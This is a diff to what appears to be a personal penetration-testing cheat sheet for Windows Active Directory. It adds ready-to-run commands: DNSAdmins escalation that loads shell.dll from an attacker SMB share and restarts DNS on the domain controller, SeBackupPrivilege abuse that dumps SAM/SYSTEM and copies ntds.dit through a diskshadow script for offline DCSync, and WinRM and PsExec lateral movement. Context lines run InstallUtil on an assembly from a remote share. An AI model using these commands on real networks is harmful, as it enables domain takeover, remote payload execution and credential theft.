@@ -711,14 +711,53 @@ Execute with InstallUtil:
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U \\192.168.45.218\pwn\assembly.exe
 ```
 ---
+### Ansible Abuse
+
 ## Persistence
 
 ## Privesc
+### DNSADMINS group
+```powershell
+dnscmd.exe /config /serverlevelplugindll \\10.10.14.57\s\shell.dll;sc.exe \\DCName stop dns;sc.exe \\DCName start dns
+```
+---
+### seBackupPrivilege/seRestorePrivilege DCSYNC
+```powershell
+reg save hklm\sam sam; reg save hklm\system system
+unix2dos shadowcopy.txt (in linux attacker machine)
+//upload shadowcopy.txt to the machine
+diskshadow /s shadowcopy.txt
+robocopy /B E:\Windows\ntds .\ntds ntds.dit
+//exfiltrate the files and perform dcsync locally
+```
 
+shadowcopy.txt:
+```
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% E:
+end backup
+```
 ## Credential Access
 
 ## Lateral Movement
-
+### WinRM
+```powershell
+$pass=ConvertTo-SecureString "myPass" -AsPlainText -Force
+$cred=New-Object System.Management.Automation.PSCredential("domain.local\username",$pass)
+Invoke-Command -Computer DC-1 -Credential $cred -ScriptBlock { systeminfo }
+```
+---
+### SMB
+```
+\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\victim.domain.com powershell.exe
+```
+---
 ## Exfiltration
 ### With simple HTTP server
 Server-side python code:
